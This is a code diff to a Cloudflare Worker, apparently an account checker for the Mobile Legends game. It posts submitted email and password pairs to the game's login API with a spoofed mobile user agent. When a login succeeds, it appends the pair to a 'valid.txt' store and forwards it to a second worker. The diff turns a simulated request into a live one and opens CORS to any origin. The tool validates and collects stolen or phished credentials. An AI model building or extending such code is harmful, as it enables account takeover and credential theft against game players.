@@ -21,16 +21,30 @@ export default {
           return Response.json({ error: "Missing parameters" }, { status: 400 });
         }
 
-        // Simulasi request ke API MLBB (ganti dengan API asli)
+        // Format body jadi x-www-form-urlencoded
+        const params = new URLSearchParams();
+        params.append("email", email);
+        params.append("password", password);
+        params.append("captcha", captcha_token);
+
+        // Kirim request ke API MLBB
         const mlbbRes = await fetch("https://accountmtapi.mobilelegends.com/", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            email,
-            password,
-            captcha: captcha_token,
-          }),
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 12; Mobile)",
+            "Accept": "*/*",
+            "Connection": "keep-alive",
+          },
+          body: params.toString(),
         });
+
+        if (!mlbbRes.ok) {
+          return Response.json(
+            { error: `MLBB API error: ${mlbbRes.status}` },
+            { status: mlbbRes.status }
+          );
+        }
 
         const data = await mlbbRes.json();
 
@@ -38,14 +52,14 @@ export default {
         if (data.code === 0) {
           const line = `${email}|${password}\n`;
 
-          // 1. Simpan ke KV sementara
-          if (env.VALID_ACCOUNTS) {
-            let old = await env.VALID_ACCOUNTS.get("valid.txt") || "";
+          // Simpan ke KV sementara
+          if (env.VALID_ACCOUNT) {
+            let old = (await env.VALID_ACCOUNT.get("valid.txt")) || "";
             old += line;
-            await env.VALID_ACCOUNTS.put("valid.txt", old);
+            await env.VALID_ACCOUNT.put("valid.txt", old);
           }
 
-          // 2. Kirim ke Worker B
+          // Kirim ke Worker B
           if (env.WORKER_B_URL && env.SECRET_KEY) {
             try {
               await fetch(env.WORKER_B_URL + "/save", {
@@ -62,13 +76,18 @@ export default {
           }
         }
 
-        return Response.json(data);
+        return Response.json(data, {
+          headers: { "Access-Control-Allow-Origin": "*" },
+        });
 
       } catch (err) {
         return Response.json({ error: err.message }, { status: 500 });
       }
     }
 
-    return new Response("Worker A aktif", { status: 200 });
+    return new Response("Worker A aktif", {
+      status: 200,
+      headers: { "Access-Control-Allow-Origin": "*" },
+    });
   },
 };
